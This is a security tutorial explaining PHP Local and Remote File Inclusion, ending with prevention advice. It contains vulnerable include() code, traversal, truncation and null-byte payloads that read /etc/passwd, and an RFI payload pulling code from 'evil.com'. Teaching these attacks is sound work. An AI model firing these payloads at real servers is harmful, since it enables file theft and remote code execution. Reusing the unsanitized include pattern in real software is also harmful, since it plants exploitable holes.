# Local File Inclusion
## What is LFI? (Local File Inclusion)
LFI is an attack that allows you to access or include local files on the servers filesystem. This attack occurs due to unsanitized input. Here is a basic example of how this attack works, let's say we have the following snippet of PHP code in our project:
```php
<?php 
    $file = $_GET['file'];

    if(isset($file)) {
        include("a/b/c/$file");
    } else {
        include("a/b/c/index.php");
    }
?>
```
A request for a homepage would look like this:
```
https://example.com/?file=home.php
```
We have complete control over the `?file` parameter, so we can simply change it to:
```
https://example.com/?file=../../../../../../../etc/passwd
OR
https://example.com/?file=/etc/passwd
```
An application can also have a extension as a suffix that can prevent us from accessing files that do not have the same extension, for example:
```php
<?php 
    $file = $_GET['file'];

    if(isset($file)) {
        include("a/b/c/$file"."php");
    } else {
        include("a/b/c/index.php");
    }
?>
```
A request for a homepage then would be:
```
https://example.com/?file=home
```
How can we evade the `.php` extension? 

### Path Truncation ( < PHP 5.3.0 )
This technique takes advantage of the file size limit of PHP. Any file that exceeds 4096 bytes will have everything after that size discarded, including the ".php" suffix. An example of this kind of attack would be:
```
https://example.com/?file=invalidFile../../../../../../../../etc/passwd/././././<repeat "./" until 4096 Bytes or more>
```
There are a couple of attack vectors described [here](https://book.hacktricks.xyz/pentesting-web/file-inclusion#path-truncation).

### Null Byte Injection ( < PHP 5.4.0 )
Null Byte Injection is basically a way to evade this kind of suffix using nothing but a NULL character. The way it works is that you append the [%00](https://en.wikipedia.org/wiki/Null_character) character to the end of a request that can indicate to the PHP interpreter that "Hey, this is the end of the string so everything after that should be discarded". This means that the request:
```
https://example.com/?file=/etc/passwd%00
```
Would resolve in the source code like this:
```php
<?php
    $file = "/etc/passwd%00"; // $_GET['file']

    if(isset($file)) {
        include("/etc/passwd"); // The .php extension is discarded because of the NULL char.
    } else {
        include("a/b/c/index.php");
    }
?>
```

### How dangerous is this vulnerability?
This type of attack allows us to:
- Execute malicious code ( Using RFI or via a File Upload Vulnerability ).
- Read the source code of pages using the [php://filter](https://medium.com/@gupta.bless/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225) PHP Wrapper.
## What is RFI? (Remote File Inclusion)
Remote File Inclusion works the same way as LFI, except rather than accessing a file on the web server, the server accesses a remote file via a URL. An example would be:
```php
<?php 
    $file = $_GET['file'];

    if(isset($file)) {
        include("a/b/c/$file");
    } else {
        include("a/b/c/index.php");
    }
?>
```
A request for a homepage would look like this:
```
https://example.com/?file=home.php
```
This time, rather than accessing a local file, we provide a URL to a different website:
```
https://example.com/?file=http://evil.com/evil.php
```
In this example, the webserver includes the malicious code and runs it with its execution permissions. This allows an attacker to run any code he/she wants to, including a webshell. This gives the attacker complete control over the web server.

## How can it be prevented?
The best way to eliminate this kind of attack is to never include files based on user input, but if there isn't any other option, you can create an allowlist of filenames that can be included using a simple switch statement.
## Useful resources:
- [Null Byte Injection - PHP](https://resources.infosecinstitute.com/null-byte-injection-php/)
- [File Inclusion - HackTricks.xyz](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Remote File Inclusion - Acunetix](https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/)

*A docker application for testing this exploit soon!*